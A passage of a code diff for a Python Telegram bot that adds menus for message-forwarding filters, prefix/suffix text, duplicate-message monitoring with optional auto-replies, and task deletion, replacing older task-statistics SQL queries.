+    numbers_only_emoji = "✅" if filter_settings.get("numbers_only", False) else "❌"
+    alphabets_only_emoji = "✅" if filter_settings.get("alphabets_only", False) else "❌"
+    removed_alphabetic_emoji = "✅" if filter_settings.get("removed_alphabetic", False) else "❌"
+    removed_numeric_emoji = "✅" if filter_settings.get("removed_numeric", False) else "❌"
+    
+    prefix = filter_settings.get("prefix", "")
+    suffix = filter_settings.get("suffix", "")
+    prefix_text = f"'{prefix}'" if prefix else "Not set"
+    suffix_text = f"'{suffix}'" if suffix else "Not set"
+    
+    message_text = f"🔍 **Filters for: {task_label}**\n\nApply filters to messages before forwarding:\n\n📋 **Available Filters:**\n{raw_text_emoji} Raw text - Forward any text\n{numbers_only_emoji} Numbers only - Forward only numbers\n{alphabets_only_emoji} Alphabets only - Forward only letters\n{removed_alphabetic_emoji} Removed Alphabetic - Keep letters & special chars, remove numbers & emojis\n{removed_numeric_emoji} Removed Numeric - Keep numbers & special chars, remove letters & emojis\n📝 **Prefix:** {prefix_text}\n📝 **Suffix:** {suffix_text}\n\n💡 **Multiple filters can be active at once!**"
+    
+    keyboard = [
+        [
+            InlineKeyboardButton(f"{raw_text_emoji} Raw text", callback_data=f"toggle_forward_{task_label}_raw_text"),
+            InlineKeyboardButton(f"{numbers_only_emoji} Numbers only", callback_data=f"toggle_forward_{task_label}_numbers_only")
+        ],
+        [
+            InlineKeyboardButton(f"{alphabets_only_emoji} Alphabets only", callback_data=f"toggle_forward_{task_label}_alphabets_only"),
+            InlineKeyboardButton(f"{removed_alphabetic_emoji} Removed Alphabetic", callback_data=f"toggle_forward_{task_label}_removed_alphabetic")
+        ],
+        [
+            InlineKeyboardButton(f"{removed_numeric_emoji} Removed Numeric", callback_data=f"toggle_forward_{task_label}_removed_numeric"),
+            InlineKeyboardButton("📝 Prefix/Suffix", callback_data=f"toggle_forward_{task_label}_prefix_suffix")
+        ],
+        [InlineKeyboardButton("🔙 Back to Task", callback_data=f"forward_task_{task_label}")]
+    ]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+
+async def handle_toggle_forward_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    data_parts = query.data.replace("toggle_forward_", "").split("_")
+    
+    if len(data_parts) < 2:
+        await query.answer("Invalid action!", show_alert=True)
+        return
+    
+    task_label = data_parts[0]
+    toggle_type = "_".join(data_parts[1:])
+    
+    user_tasks = forwarding_tasks_cache.get(user_id, [])
+    task_index = -1
+    for i, t in enumerate(user_tasks):
+        if t["label"] == task_label:
+            task_index = i
+            break
+    
+    if task_index == -1:
+        await query.answer("Task not found!", show_alert=True)
+        return
+    
+    task = user_tasks[task_index]
+    filters = task.get("filters", {})
+    new_state = None
+    status_text = ""
+    
+    if toggle_type == "outgoing":
+        new_state = not filters.get("outgoing", True)
+        filters["outgoing"] = new_state
+        status_text = "Outgoing messages"
+        
+    elif toggle_type == "forward_tag":
+        new_state = not filters.get("forward_tag", False)
+        filters["forward_tag"] = new_state
+        status_text = "Forward tag"
+        
+    elif toggle_type == "control":
+        new_state = not filters.get("control", True)
+        filters["control"] = new_state
+        status_text = "Forwarding control"
+        
+    elif toggle_type in ["raw_text", "numbers_only", "alphabets_only", "removed_alphabetic", "removed_numeric"]:
+        filter_settings = filters.get("filters", {})
+        new_state = not filter_settings.get(toggle_type, False)
+        filter_settings[toggle_type] = new_state
+        filters["filters"] = filter_settings
+        status_text = toggle_type.replace('_', ' ').title()
+        
+    elif toggle_type == "prefix_suffix":
+        await show_prefix_suffix_menu(query, task_label, "forward")
+        return
+    
+    elif toggle_type == "clear_prefix_suffix":
+        filter_settings = filters.get("filters", {})
+        filter_settings["prefix"] = ""
+        filter_settings["suffix"] = ""
+        filters["filters"] = filter_settings
+        new_state = False
+        task["filters"] = filters
+        forwarding_tasks_cache[user_id][task_index] = task
+        
+        asyncio.create_task(
+            db_call(db.update_task_filters, user_id, task_label, filters)
+        )
+        
+        await query.answer("✅ Prefix and suffix cleared!")
+        await handle_forward_filter_menu(update, context)
+        return
+    
+    else:
+        await query.answer(f"Unknown toggle type: {toggle_type}")
+        return
+    
+    task["filters"] = filters
+    forwarding_tasks_cache[user_id][task_index] = task
+    
+    new_emoji = "✅" if new_state else "❌"
+    status_display = "✅ On" if new_state else "❌ Off"
+    
+    try:
+        keyboard = query.message.reply_markup.inline_keyboard
+        new_keyboard = []
+        for row in keyboard:
+            new_row = []
+            for button in row:
+                if button.callback_data == query.data:
+                    current_text = button.text
+                    if "✅ " in current_text:
+                        text_without_emoji = current_text.split("✅ ", 1)[1]
+                        new_text = f"{new_emoji} {text_without_emoji}"
+                    elif "❌ " in current_text:
+                        text_without_emoji = current_text.split("❌ ", 1)[1]
+                        new_text = f"{new_emoji} {text_without_emoji}"
+                    elif current_text.startswith("✅"):
+                        text_without_emoji = current_text[1:]
+                        new_text = f"{new_emoji}{text_without_emoji}"
+                    elif current_text.startswith("❌"):
+                        text_without_emoji = current_text[1:]
+                        new_text = f"{new_emoji}{text_without_emoji}"
+                    else:
+                        new_text = f"{new_emoji} {current_text}"
+                    
+                    new_row.append(InlineKeyboardButton(new_text, callback_data=query.data))
+                else:
+                    new_row.append(button)
+            new_keyboard.append(new_row)
+        
+        await query.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup(new_keyboard)
+        )
+        await query.answer(f"{status_text}: {status_display}")
+    except Exception:
+        await query.answer(f"{status_text}: {status_display}")
+        if toggle_type in ["outgoing", "forward_tag", "control"]:
+            await handle_forward_task_menu(update, context)
+        else:
+            await handle_forward_filter_menu(update, context)
+    
+    asyncio.create_task(
+        db_call(db.update_task_filters, user_id, task_label, filters)
+    )
+
+async def show_prefix_suffix_menu(query, task_label: str, task_type: str):
+    user_id = query.from_user.id
+    
+    if task_type == "forward":
+        user_tasks = forwarding_tasks_cache.get(user_id, [])
+        task_key = "filters"
+        filter_key = "filters"
+    else:
+        user_tasks = monitoring_tasks_cache.get(user_id, [])
+        task_key = "settings"
+        filter_key = None  # Monitoring tasks don't use prefix/suffix
+    
+    task = None
+    for t in user_tasks:
+        if t["label"] == task_label:
+            task = t
+            break
+    
+    if not task:
+        await query.answer("Task not found!", show_alert=True)
+        return
+    
+    if task_type == "forward":
+        filters = task.get("filters", {})
+        filter_settings = filters.get("filters", {})
+        prefix = filter_settings.get("prefix", "")
+        suffix = filter_settings.get("suffix", "")
+    else:
+        # Monitoring tasks don't have prefix/suffix
+        await query.answer("Prefix/suffix only available for forwarding tasks!")
+        return
+    
+    message_text = f"🔤 **Prefix/Suffix Setup for: {task_label}**\n\nAdd custom text to messages:\n\n📝 **Current Prefix:** '{prefix}'\n📝 **Current Suffix:** '{suffix}'\n\n💡 **Examples:**\n• Prefix '🔔 ' adds a bell before each message\n• Suffix ' ✅' adds a checkmark after\n• Use any characters: emojis, signs, numbers, letters\n\n**Tap an option below to set it!**"
+    
+    keyboard = [
+        [InlineKeyboardButton("➕ Set Prefix", callback_data=f"prefix_{task_label}_{task_type}")],
+        [InlineKeyboardButton("➕ Set Suffix", callback_data=f"suffix_{task_label}_{task_type}")],
+        [InlineKeyboardButton("🗑️ Clear Prefix/Suffix", callback_data=f"toggle_{task_type}_{task_label}_clear_prefix_suffix")],
+        [InlineKeyboardButton("🔙 Back to Filters", callback_data=f"{task_type}_filter_{task_label}")]
+    ]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+
+async def handle_prefix_suffix(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    data_parts = query.data.split("_")
+    
+    if len(data_parts) < 3:
+        await query.answer("Invalid action!", show_alert=True)
+        return
+    
+    action_type = data_parts[0]  # prefix or suffix
+    task_label = data_parts[1]
+    task_type = data_parts[2]  # forward or monitor
+    
+    if task_type != "forward":
+        await query.answer("Prefix/suffix only available for forwarding tasks!")
+        return
+    
+    context.user_data[f"waiting_{action_type}"] = {"task_label": task_label, "task_type": task_type}
+    await query.edit_message_text(
+        f"📝 **Enter the {action_type} text for task '{task_label}':**\n\nType your {action_type} text now.\n💡 *You can use any characters: emojis 🔔, signs ⚠️, numbers 123, letters ABC*\n\n**Example:** If you want the {action_type} '🔔 ', type: 🔔 ",
+        parse_mode="Markdown"
+    )
+
+async def handle_prefix_suffix_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    
+    waiting_data = context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix")
+    if not waiting_data:
+        return
+    
+    action_type = "prefix" if "waiting_prefix" in context.user_data else "suffix"
+    task_label = waiting_data["task_label"]
+    task_type = waiting_data["task_type"]
+    
+    # Clear the waiting state
+    if "waiting_prefix" in context.user_data:
+        del context.user_data["waiting_prefix"]
+    if "waiting_suffix" in context.user_data:
+        del context.user_data["waiting_suffix"]
+    
+    if task_type == "forward":
+        user_tasks = forwarding_tasks_cache.get(user_id, [])
+        task_index = -1
+        for i, t in enumerate(user_tasks):
+            if t["label"] == task_label:
+                task_index = i
+                break
+        
+        if task_index == -1:
+            await update.message.reply_text("❌ Task not found!")
+            return
+        
+        task = user_tasks[task_index]
+        filters = task.get("filters", {})
+        filter_settings = filters.get("filters", {})
+        
+        if action_type == "prefix":
+            filter_settings["prefix"] = text
+            confirmation = f"✅ **Prefix set to:** '{text}'"
+        else:
+            filter_settings["suffix"] = text
+            confirmation = f"✅ **Suffix set to:** '{text}'"
+        
+        filters["filters"] = filter_settings
+        task["filters"] = filters
+        forwarding_tasks_cache[user_id][task_index] = task
+        
+        asyncio.create_task(
+            db_call(db.update_task_filters, user_id, task_label, filters)
+        )
+        
+        await update.message.reply_text(
+            f"{confirmation}\n\nTask: **{task_label}**\n\nAll messages will now include this text when forwarded!",
+            parse_mode="Markdown"
+        )
+    else:
+        await update.message.reply_text("❌ Prefix/suffix only available for forwarding tasks!")
+
+async def handle_delete_forward_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    task_label = query.data.replace("delete_forward_", "")
+    
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
+    
+    message_text = f"🗑️ **Delete Forwarding Task: {task_label}**\n\n⚠️ **Are you sure you want to delete this task?**\n\nThis action cannot be undone!\nAll forwarding will stop immediately."
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("✅ Yes, Delete", callback_data=f"confirm_delete_forward_{task_label}"),
+            InlineKeyboardButton("❌ Cancel", callback_data=f"forward_task_{task_label}")
+        ]
+    ]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+
+async def handle_confirm_delete_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    task_label = query.data.replace("confirm_delete_forward_", "")
+    
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
+    
+    deleted = await db_call(db.remove_forwarding_task, user_id, task_label)
+    
+    if deleted:
+        if user_id in forwarding_tasks_cache:
+            forwarding_tasks_cache[user_id] = [t for t in forwarding_tasks_cache[user_id] if t.get("label") != task_label]
+        
+        # Update forwarding handlers
+        if user_id in user_clients:
+            await update_forwarding_for_user(user_id)
+        
+        await query.edit_message_text(
+            f"✅ **Task '{task_label}' deleted successfully!**\n\nAll forwarding for this task has been stopped.",
+            parse_mode="Markdown"
+        )
+    else:
+        await query.edit_message_text(
+            f"❌ **Task '{task_label}' not found!**",
+            parse_mode="Markdown"
+        )
+
+# ============================
+# MONITORING SYSTEM COMMANDS
+# ============================
+async def monitoradd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not await check_authorization(update, context):
+        return
+    
+    if await check_phone_number_required(user_id):
+        await ask_for_phone_number(user_id, update.message.chat.id, context)
+        return
+    
+    user = await db_call(db.get_user, user_id)
+    if not user or not user.get("is_logged_in"):
+        await update.message.reply_text(
+            "❌ **You need to connect your account first!**\n\nUse /login to connect your Telegram account.",
+            parse_mode="Markdown"
+        )
+        return
+    
+    task_creation_states[user_id] = {
+        "step": "waiting_name",
+        "type": "monitoring",
+        "name": "",
+        "chat_ids": []
+    }
+    
+    await update.message.reply_text(
+        "🎯 **Let's create a new monitoring task!**\n\n"
+        "📝 **Step 1 of 2:** Please enter a name for your monitoring task.\n\n"
+        "💡 *Example: Group Duplicate Checker*",
+        parse_mode="Markdown"
+    )
+
+async def monitortasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message:
+        user_id = update.effective_user.id
+        message = update.message
+    else:
+        user_id = update.callback_query.from_user.id
+        message = update.callback_query.message
+    
+    if not await check_authorization(update, context):
+        return
+    
+    if await check_phone_number_required(user_id):
+        await ask_for_phone_number(user_id, message.chat.id, context)
+        return
+    
+    tasks = monitoring_tasks_cache.get(user_id, [])
+    
+    if not tasks:
+        await message.reply_text(
+            "📋 **No Active Monitoring Tasks**\n\n"
+            "You don't have any monitoring tasks yet.\n\n"
+            "Create one with:\n"
+            "/monitoradd",
+            parse_mode="Markdown"
+        )
+        return
+    
+    task_list = "📋 **Your Monitoring Tasks**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    keyboard = []
+    
+    for i, task in enumerate(tasks, 1):
+        task_list += f"{i}. **{task['label']}**\n"
+        task_list += f"   📥 Monitoring: {', '.join(map(str, task['chat_ids']))}\n\n"
+        keyboard.append([InlineKeyboardButton(f"{i}. {task['label']}", callback_data=f"monitor_task_{task['label']}")])
+    
+    task_list += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nTotal: **{len(tasks)} task(s)**\n\n💡 **Tap any task below to manage it!**"
+    
+    await message.reply_text(
+        task_list,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+
+async def handle_monitor_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    task_label = query.data.replace("monitor_task_", "")
+    
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
+    
+    user_tasks = monitoring_tasks_cache.get(user_id, [])
+    task = next((t for t in user_tasks if t["label"] == task_label), None)
+    
+    if not task:
+        await query.answer("Task not found!", show_alert=True)
+        return
+    
+    settings = task.get("settings", {})
+    
+    check_duo_emoji = "✅" if settings.get("check_duplicate_and_notify", True) else "❌"
+    manual_reply_emoji = "✅" if settings.get("manual_reply_system", True) else "❌"
+    auto_reply_emoji = "✅" if settings.get("auto_reply_system", False) else "❌"
+    outgoing_emoji = "✅" if settings.get("outgoing_message_monitoring", True) else "❌"
+    
+    auto_reply_message = settings.get("auto_reply_message", "")
+    auto_reply_display = f"Auto Reply = '{auto_reply_message[:30]}{'...' if len(auto_reply_message) > 30 else ''}'" if auto_reply_message else "Auto Reply = Off"
+    
+    message_text = f"🔧 **Monitor Task Management: {task_label}**\n\n"
+    message_text += f"📥 **Monitoring Chats:** {', '.join(map(str, task['chat_ids']))}\n\n"
+    message_text += "⚙️ **Settings:**\n"
+    message_text += f"{check_duo_emoji} Check Duo & Notify - Detects duplicates and sends alerts\n"
+    message_text += f"{manual_reply_emoji} Manual reply system - Allows manual replies to duplicates\n"
+    message_text += f"{auto_reply_emoji} {auto_reply_display}\n"
+    message_text += f"{outgoing_emoji} Outgoing Message monitoring - Monitors your outgoing messages\n\n"
+    message_text += "💡 **Tap any option below to change it!**"
+    
+    keyboard = [
+        [
+            InlineKeyboardButton(f"{check_duo_emoji} Check Duo & Notify", callback_data=f"toggle_monitor_{task_label}_check_duplicate_and_notify"),
+            InlineKeyboardButton(f"{manual_reply_emoji} Manual Reply", callback_data=f"toggle_monitor_{task_label}_manual_reply_system")
+        ],
+        [
+            InlineKeyboardButton(f"{auto_reply_emoji} Auto Reply", callback_data=f"toggle_monitor_{task_label}_auto_reply_system"),
+            InlineKeyboardButton(f"{outgoing_emoji} Outgoing", callback_data=f"toggle_monitor_{task_label}_outgoing_message_monitoring")
+        ],
+        [InlineKeyboardButton("🗑️ Delete", callback_data=f"delete_monitor_{task_label}")],
+        [InlineKeyboardButton("🔙 Back to Monitor Tasks", callback_data="show_monitor_tasks")]
+    ]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+
+async def handle_toggle_monitor_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    data_parts = query.data.replace("toggle_monitor_", "").split("_")
+    
+    if len(data_parts) < 2:
+        await query.answer("Invalid action!", show_alert=True)
+        return
+    
+    task_label = data_parts[0]
+    toggle_type = "_".join(data_parts[1:])
+    
+    user_tasks = monitoring_tasks_cache.get(user_id, [])
+    task_index = next((i for i, t in enumerate(user_tasks) if t["label"] == task_label), -1)
+    
+    if task_index == -1:
+        await query.answer("Task not found!", show_alert=True)
+        return
+    
+    task = user_tasks[task_index]
+    settings = task.get("settings", {})
+    new_state = None
+    status_text = ""
+    
+    if toggle_type == "check_duplicate_and_notify":
+        new_state = not settings.get("check_duplicate_and_notify", True)
+        settings["check_duplicate_and_notify"] = new_state
+        status_text = "Check Duo & Notify"
+    
+    elif toggle_type == "manual_reply_system":
+        new_state = not settings.get("manual_reply_system", True)
+        settings["manual_reply_system"] = new_state
+        status_text = "Manual reply system"
+    
+    elif toggle_type == "auto_reply_system":
+        current_state = settings.get("auto_reply_system", False)
+        
+        if not current_state:
+            context.user_data[f"waiting_auto_reply_{task_label}"] = True
+            await query.edit_message_text(
+                f"🤖 **Auto Reply Setup for: {task_label}**\n\n"
+                "Please enter the message you want to use for auto reply.\n\n"
+                "⚠️ **Important:** This message will be sent automatically whenever a duplicate is detected.\n"
+                "It will appear as coming from your account.\n\n"
+                "💡 **Example messages:**\n"
+                "• 'Please avoid sending duplicate messages.'\n"
+                "• 'This message was already sent.'\n"
+                "• 'Duplicate detected.'\n\n"
+                "**Type your auto reply message now:**",
+                parse_mode="Markdown"
+            )
+            return
+        else:
+            new_state = False
+            settings["auto_reply_system"] = new_state
+            settings["auto_reply_message"] = ""
+            status_text = "Auto Reply system"
+    
+    elif toggle_type == "outgoing_message_monitoring":
+        new_state = not settings.get("outgoing_message_monitoring", True)
+        settings["outgoing_message_monitoring"] = new_state
+        status_text = "Outgoing message monitoring"
+    
+    else:
+        await query.answer(f"Unknown toggle type: {toggle_type}")
+        return
+    
+    if new_state is not None:
+        task["settings"] = settings
+        monitoring_tasks_cache[user_id][task_index] = task
+    
+    if toggle_type != "auto_reply_system":
+        keyboard = query.message.reply_markup.inline_keyboard if query.message.reply_markup else []
+        button_found = False
+        new_emoji = "✅" if new_state else "❌"
+        
+        new_keyboard = []
+        for row in keyboard:
+            new_row = []
+            for button in row:
+                if button.callback_data == query.data:
+                    current_text = button.text
+                    if "✅ " in current_text:
+                        text_without_emoji = current_text.split("✅ ", 1)[1]
+                        new_text = f"{new_emoji} {text_without_emoji}"
+                    elif "❌ " in current_text:
+                        text_without_emoji = current_text.split("❌ ", 1)[1]
+                        new_text = f"{new_emoji} {text_without_emoji}"
+                    elif current_text.startswith("✅"):
+                        text_without_emoji = current_text[1:]
+                        new_text = f"{new_emoji}{text_without_emoji}"
+                    elif current_text.startswith("❌"):
+                        text_without_emoji = current_text[1:]
+                        new_text = f"{new_emoji}{text_without_emoji}"
+                    else:
+                        new_text = f"{new_emoji} {current_text}"
+                    
+                    new_row.append(InlineKeyboardButton(new_text, callback_data=query.data))
+                    button_found = True
+                else:
+                    new_row.append(button)
+            new_keyboard.append(new_row)
+        
+        if button_found:
+            try:
+                await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(new_keyboard))
+                status_display = "✅ Active" if new_state else "❌ Inactive"
+                await query.answer(f"{status_text}: {status_display}")
+            except Exception:
+                status_display = "✅ Active" if new_state else "❌ Inactive"
+                await query.answer(f"{status_text}: {status_display}")
+                await handle_monitor_task_menu(update, context)
+        else:
+            status_display = "✅ Active" if new_state else "❌ Inactive"
+            await query.answer(f"{status_text}: {status_display}")
+            await handle_monitor_task_menu(update, context)
+    
+    if new_state is not None or toggle_type == "auto_reply_system":
+        try:
+            asyncio.create_task(db_call(db.update_task_settings, user_id, task_label, settings))
+            logger.info(f"Updated task {task_label} setting {toggle_type} to {new_state} for user {user_id}")
+        except Exception as e:
+            logger.exception("Error updating task settings in DB: %s", e)
+
+async def handle_auto_reply_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = (update.message.text or "").strip()
+    
+    waiting_for_auto_reply = False
+    task_label = None
+    
+    for key in list(context.user_data.keys()):
+        if key.startswith("waiting_auto_reply_"):
+            waiting_for_auto_reply = True
+            task_label = key.replace("waiting_auto_reply_", "")
+            del context.user_data[key]
+            break
+    
+    if not waiting_for_auto_reply or not task_label:
+        return
+    
+    user_tasks = monitoring_tasks_cache.get(user_id, [])
+    task_index = next((i for i, t in enumerate(user_tasks) if t["label"] == task_label), -1)
+    
+    if task_index == -1:
+        await update.message.reply_text("❌ Task not found!")
+        return
+    
+    task = user_tasks[task_index]
+    settings = task.get("settings", {})
+    
+    settings["auto_reply_system"] = True
+    settings["auto_reply_message"] = text
+    
+    task["settings"] = settings
+    monitoring_tasks_cache[user_id][task_index] = task
+    
+    try:
+        await db_call(db.update_task_settings, user_id, task_label, settings)
+    except Exception as e:
+        logger.exception("Error updating task settings in DB: %s", e)
+        await update.message.reply_text("❌ Error saving auto reply message!")
+        return
+    
+    await update.message.reply_text(
+        f"✅ **Auto Reply Message Added Successfully!**\n\n"
+        f"Task: **{task_label}**\n"
+        f"Auto Reply Message: '{text}'\n\n"
+        "This message will be sent automatically whenever a duplicate is detected.\n"
+        "⚠️ **Remember:** It will appear as coming from your account.",
+        parse_mode="Markdown"
+    )
+    
+    logger.info(f"Auto reply message set for task {task_label} by user {user_id}")
+
+async def handle_delete_monitor_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    task_label = query.data.replace("delete_monitor_", "")
+    
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
+    
+    message_text = f"🗑️ **Delete Monitoring Task: {task_label}**\n\n"
+    message_text += "⚠️ **Are you sure you want to delete this task?**\n\n"
+    message_text += "This action cannot be undone!\n"
+    message_text += "All monitoring will stop immediately."
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("✅ Yes, Delete", callback_data=f"confirm_delete_monitor_{task_label}"),
+            InlineKeyboardButton("❌ Cancel", callback_data=f"monitor_task_{task_label}")
+        ]
+    ]
+    
+    await query.edit_message_text(
+        message_text,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode="Markdown"
+    )
+
+async def handle_confirm_delete_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
+    task_label = query.data.replace("confirm_delete_monitor_", "")
+    
+    if await check_phone_number_required(user_id):
+        await query.answer()
+        await ask_for_phone_number(user_id, query.message.chat.id, context)
+        return
+    
+    deleted = await db_call(db.remove_monitoring_task, user_id, task_label)
+    
+    if deleted:
+        if user_id in monitoring_tasks_cache:
+            monitoring_tasks_cache[user_id] = [t for t in monitoring_tasks_cache[user_id] if t.get('label') != task_label]
+        
+        if user_id in user_clients:
+            await update_monitoring_for_user(user_id)
+        
+        await query.edit_message_text(
+            f"✅ **Task '{task_label}' deleted successfully!**\n\n"
+            "All monitoring for this task has been stopped.",
+            parse_mode="Markdown"
+        )
+    else:
+        await query.edit_message_text(
+            f"❌ **Task '{task_label}' not found!**",
+            parse_mode="Markdown"
+        )
+
+# ============================
+# TASK CREATION HANDLER
+# ============================
+async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+
+    if user_id in phone_verification_states:
+        await handle_phone_verification(update, context)
+        return
+
+    if user_id in task_creation_states:
+        state = task_creation_states[user_id]
+        task_type = state.get("type", "forwarding")
+
+        try:
+            if state["step"] == "waiting_name":
+                if not text:
+                    await update.message.reply_text("❌ **Please enter a valid task name!**")
+                    return
+
+                state["name"] = text
+                state["step"] = "waiting_ids"
+
+                if task_type == "forwarding":
+                    await update.message.reply_text(
+                        f"✅ **Task name saved:** {text}\n\n📥 **Step 2 of 3:** Please enter the source chat ID(s).\n\nYou can enter multiple IDs separated by spaces.\n💡 *Use /getallid to find your chat IDs*\n\n**Example:** `123456789 987654321`",
+                        parse_mode="Markdown"
+                    )
+                else:  # monitoring
+                    await update.message.reply_text(
+                        f"✅ **Task name saved:** {text}\n\n"
+                        "📥 **Step 2 of 2:** Please enter the chat ID(s) to monitor.\n\n"
+                        "You can enter multiple IDs separated by spaces.\n"
+                        "💡 *Use /getallid to find your chat IDs*\n\n"
+                        "**Example:** `-1001234567890 -1009876543210`",
+                        parse_mode="Markdown"
+                    )
+
+            elif state["step"] == "waiting_ids":
+                if not text:
+                    await update.message.reply_text("❌ **Please enter at least one ID!**")
+                    return
+
                 try:
-                    active_rows = execute_query(
-                        bot_id,
-                        "SELECT user_id, username, SUM(total_words - COALESCE(sent_count,0)) as remaining, COUNT(*) as active_count FROM {prefix}tasks WHERE status IN ('running','paused') GROUP BY user_id, username",
-                        fetch_all=True
-                    )
-                    
-                    queued_result = execute_query(
-                        bot_id,
-                        "SELECT COUNT(*) FROM {prefix}tasks WHERE status = 'queued'",
-                        fetch_one=True
-                    )
-                    queued_tasks = queued_result[0] if queued_result else 0
-                    
-                    queued_counts = {}
-                    queued_rows = execute_query(
-                        bot_id,
-                        "SELECT user_id, COUNT(*) FROM {prefix}tasks WHERE status = 'queued' GROUP BY user_id",
-                        fetch_all=True
-                    )
-                    for row in queued_rows:
-                        queued_counts[row[0]] = row[1]
-                    
-                except Exception:
-                    try:
-                        get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                            "callback_query_id": callback.get("id"),
-                            "text": "⚠️ Database error. Try again later."
-                        }, timeout=2)
-                    except Exception:
-                        pass
-                    return jsonify({"ok": True})
-                
-                stats_rows = compute_last_hour_stats(bot_id)
-                lines_active = []
-                for r in active_rows:
-                    uid2, uname, rem, ac = r
-                    if not uname:
-                        uname = fetch_display_username(bot_id, uid2)
-                    name = f" ({at_username(uname)})" if uname else ""
-                    queued_for_user = queued_counts.get(uid2, 0)
-                    lines_active.append(f"{uid2}{name} - {int(rem)} remaining - {int(ac)} active - {queued_for_user} queued")
-                
-                lines_stats = []
-                for uid2, uname, s in stats_rows:
-                    uname_final = at_username(uname) if uname else fetch_display_username(bot_id, uid2)
-                    lines_stats.append(f"{uid2} ({uname_final}) - {int(s)} words sent")
-                
+                    ids = [int(id_str.strip()) for id_str in text.split() if id_str.strip().lstrip('-').isdigit()]
+                    if not ids:
+                        await update.message.reply_text("❌ **Please enter valid numeric IDs!**")
+                        return
+
+                    if task_type == "forwarding":
+                        state["source_ids"] = ids
+                        state["step"] = "waiting_targets"
+
+                        await update.message.reply_text(
+                            f"✅ **Source IDs saved:** {', '.join(map(str, ids))}\n\n📤 **Step 3 of 3:** Please enter the target chat ID(s).\n\nYou can enter multiple IDs separated by spaces.\n💡 *Use /getallid to find your chat IDs*\n\n**Example:** `111222333`",
+                            parse_mode="Markdown"
+                        )
+                    else:  # monitoring
+                        state["chat_ids"] = ids
+                        
+                        task_settings = {
+                            "check_duplicate_and_notify": True,
+                            "manual_reply_system": True,
+                            "auto_reply_system": False,
+                            "auto_reply_message": "",
+                            "outgoing_message_monitoring": True
+                        }
+                        
+                        added = await db_call(db.add_monitoring_task,
+                                             user_id,
+                                             state["name"],
+                                             state["chat_ids"],
+                                             task_settings)
+                        
+                        if added:
+                            monitoring_tasks_cache.setdefault(user_id, []).append({
+                                "id": None,
+                                "label": state["name"],
+                                "chat_ids": state["chat_ids"],
+                                "is_active": 1,
+                                "settings": task_settings
+                            })
+                            
+                            await update.message.reply_text(
+                                f"🎉 **Monitoring task created successfully!**\n\n"
+                                f"📋 **Name:** {state['name']}\n"
+                                f"📥 **Monitoring Chats:** {', '.join(map(str, state['chat_ids']))}\n\n"
+                                "✅ Default settings applied:\n"
+                                "• Check Duo & Notify: ✅ Active\n"
+                                "• Manual reply system: ✅ Enabled\n"
+                                "• Auto Reply system: ❌ Disabled\n"
+                                "• Outgoing Message monitoring: ✅ Enabled\n\n"
+                                "Use /monitortasks to manage your task!",
+                                parse_mode="Markdown"
+                            )
+                            
+                            logger.info(f"Monitoring task created for user {user_id}: {state['name']}")
+                            
+                            if user_id in user_clients:
+                                await update_monitoring_for_user(user_id)
+                            
+                            del task_creation_states[user_id]
+                        
+                        else:
+                            await update.message.reply_text(
+                                f"❌ **Task '{state['name']}' already exists!**\n\n"
+                                "Please choose a different name.",
+                                parse_mode="Markdown"
+                            )
+
+                except ValueError:
+                    await update.message.reply_text("❌ **Please enter valid numeric IDs only!**")
+
+            elif state["step"] == "waiting_targets" and task_type == "forwarding":
+                if not text:
+                    await update.message.reply_text("❌ **Please enter at least one target ID!**")
+                    return
+
                 try:
-                    total_allowed_result = execute_query(
-                        bot_id,
-                        "SELECT COUNT(*) FROM {prefix}allowed_users",
-                        fetch_one=True
-                    )
-                    total_allowed = total_allowed_result[0] if total_allowed_result else 0
-                    
